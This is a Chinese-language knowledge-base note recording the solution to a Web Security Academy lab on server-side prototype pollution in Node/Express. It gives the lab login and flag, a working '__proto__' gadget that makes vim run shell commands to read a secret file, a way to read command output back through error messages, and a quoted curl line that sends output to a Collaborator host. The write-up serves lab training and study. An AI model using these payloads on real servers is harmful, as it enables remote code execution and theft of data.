---
title: lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution
links:
- target: prototype-pollution-family
  relation: evidences
---

# lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution

> evidences: [[prototype-pollution-family]]

- 题面:Node/Express,PP 注入任意命令,外带 `/home/carlos/secret` 并提交;`wiener:peter`。本实验**没有 exploit server**。 - 判定:**solved**(横幅 `Congratulations, you solved the lab!`;实例 `0a530055…`;secret `qv6RBbMpdCOVNUqX66Mv3fu15RYQyWwT`)。

## 源与触发器

- 源:`POST /my-account/change-address`(JSON,`Content-Type: application/json;charset=UTF-8`,含 `sessionId`),`"__proto__":{…}` 写入 `Object.prototype`;响应回显污染键(可直接确认 shell/input 已落原型)。 - 触发器:`POST /admin/jobs`(JSON `{"csrf","sessionId","tasks":["db-cleanup","fs-cleanup"]}`;表单编码/空体会 500)。基线两任务 `success:true`。 - 登录也是 JSON:`POST /login` `{"csrf","username","password"}`。

## 命令执行 gadget(实测可用)

```` json "__proto__": {"shell":"vim","input":":! cat /home/carlos/secret 1>&2
"} ```
- `shell:"vim"` 让 runner 以 vim 当 shell;`input` 喂 vim stdin,`
` 结尾的 `:!` 行作为 Ex 命令执行 ⇒ 任意 OS 命令。 - runner 底层命令是 `od -An -N1 -i /dev/random`;vim 非终端运行必然以 code 1 失败 —— 这正是信道。 - 与 `execArgv` 型(`fork` 专用 `--eval=…`)不是同一 gadget:`execArgv` 污染无影响 ⇒ runner 不是 `fork`。
## 外带信道(无需 Collaborator)
- 失败任务的响应带 **`error.message` = Node `Command failed: <cmd>` + 完整子进程 stderr**。把输出写 stderr 即可读回: `:! cat /home/carlos/secret; cat /home/carlos/secret 1>&2; cat /home/carlos/secret | base64 -w0 1>&2` - 明文可能被终端转义粘成一行,**用同一轮的 base64 段反推明文边界**(base64 段解码即明文,可定位起点)。 - 旧结论"响应无 stdout / 只有 success 信号面"作废:信号面是 **error.message**。 - 相对路径写 webroot 不可行(child 的 CWD 下没有 `resources/`、`image/`):`/bin/bash: resources/leak1.txt: No such file or directory`。
## 来源
- `shell`/`input`(vim)gadget 取自第三方 writeup:siunam321 CTF-Writeups `Portswigger-Labs/Prototype-Pollution/Prototype-10`、gwyomarch/WebSecurityAcademy `PrototypePollution/exploit-lab10.py`、1392081456/ctf-notes `web/portswigger_prototype_pollution_series.md`(这些文把 exfil 题写成 `shell`+`input`;`execArgv` 形是**同族 RCE 题**的 gadget)。 - ⚠ writeup 的 `:! … | curl -d @- https://<Collaborator>` 外带腿在本环境不可用(无 Collaborator);本条把外带腿换成 **`error.message` 读子进程 stderr**(自研适配,自测确认)。 - 源/触发端点的 JSON 契约与 500 语义为自测确认;官方题页 solution details 块未读。
## 相关族
- [[prototype-pollution-family]];对照 [[lab-remote-code-execution-via-server-side-prototype-pollution]]。
````
